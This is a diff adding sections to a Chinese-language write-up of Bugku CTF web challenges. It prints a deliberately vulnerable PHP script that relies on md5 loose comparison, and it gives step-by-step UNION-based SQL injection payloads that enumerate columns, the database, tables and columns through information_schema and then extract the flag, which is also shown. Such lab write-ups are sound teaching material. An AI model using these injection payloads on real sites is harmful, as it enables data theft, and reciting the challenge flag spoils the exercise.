@@ -145,3 +145,80 @@ JavaScript代码组成的表达式
 >
 > https://blog.csdn.net/EustiaSora/article/details/79149411
 
+![备份是个好习惯](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF.png)
+
+```php
+<?php
+/**
+ * Created by PhpStorm.
+ * User: Norse
+ * Date: 2017/8/6
+ * Time: 20:22
+*/
+
+include_once "flag.php";
+ini_set("display_errors", 0);
+$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);
+echo md5($key1);
+
+echo md5($key2);
+if(md5($key1) == md5($key2) && $key1 !== $key2){
+    echo $flag."取得flag";
+}
+?>
+```
+
+得到上面的代码后，构造相应的get请求，得到flag
+
+![备份是个好习惯2](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF2.png)
+
+# 成绩单
+
+首先分别输入1,2,3，均有输出，输入1’，没有回应，因此可以判断存在sql注入
+
+分别输入
+
+```sql
+1' order by 1#
+1' order by 2#
+1' order by 3#
+1' order by 4#
+```
+
+均有回应，但是当我们使用 `1' order by 5#` 时，没有回应，可以根据此判断字段数为4。
+
+然后联合查询，输入 `1' union select 1,2,3,4#`，没有显示有用的东西，因为 id=1 被覆盖，输入 
+
+```sql
+5' union select 1,2,3,database()#
+```
+
+即设置一个新的id，要select的值会显示在表上（覆盖）。
+
+现在我们得到了一个数据库的名字 `skctf_flag`，之后就进行爆表
+
+```sql
+id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# 
+```
+
+得到表名：fl4g,sc
+
+接下来就要爆字段了
+
+```sql
+id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#
+```
+
+得到字段skctf_flag
+
+最后就是查询数据了，通过使用：
+
+```sql
+id=-1' union select 1,2,3,skctf_flag from fl4g#
+```
+
+得到flag：BUGKU{Sql_INJECT0N_4813drd8hz4}
+
